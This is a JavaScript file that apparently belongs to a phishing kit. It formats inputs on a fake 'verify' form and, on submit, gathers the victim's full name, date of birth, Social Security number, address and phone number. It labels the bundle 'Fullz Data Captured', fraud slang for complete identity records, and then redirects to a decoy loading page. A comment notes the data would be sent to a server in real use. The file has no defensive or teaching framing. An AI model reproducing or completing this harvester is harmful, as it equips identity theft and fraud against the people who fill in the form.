// Form handling
const form = document.getElementById('verifyForm');
const verifyBtn = document.getElementById('verifyBtn');
const ssnInput = document.getElementById('ssn');
const zipInput = document.getElementById('zip-code');
const phoneInput = document.getElementById('phone-number');

// Format SSN as XXX-XX-XXXX
ssnInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 9) value = value.slice(0, 9);
    
    if (value.length > 5) {
        value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5);
    } else if (value.length > 3) {
        value = value.slice(0, 3) + '-' + value.slice(3);
    }
    
    e.target.value = value;
});

// Format ZIP as XXXXX or XXXXX-XXXX
zipInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 9) value = value.slice(0, 9);
    
    if (value.length > 5) {
        value = value.slice(0, 5) + '-' + value.slice(5);
    }
    
    e.target.value = value;
});

// Format phone as (XXX) XXX-XXXX
phoneInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 10) value = value.slice(0, 10);
    
    if (value.length > 6) {
        value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6);
    } else if (value.length > 3) {
        value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
    } else if (value.length > 0) {
        value = '(' + value;
    }
    
    e.target.value = value;
});

form.addEventListener('submit', (e) => {
    e.preventDefault();
    
    // Collect all form data
    const formData = {
        fullName: document.getElementById('full-name').value,
        dateOfBirth: document.getElementById('date-of-birth').value,
        ssn: document.getElementById('ssn').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zipCode: document.getElementById('zip-code').value,
        phoneNumber: document.getElementById('phone-number').value
    };
    
    // Show loading
    verifyBtn.classList.add('loading');
    
    // Log the data (in real scenario, this would be sent to a server)
    console.log('Fullz Data Captured:', formData);
    
    // Simulate processing
    setTimeout(() => {
        // Redirect to loading page
        window.location.href = 'loading.html';
    }, 1000);
});
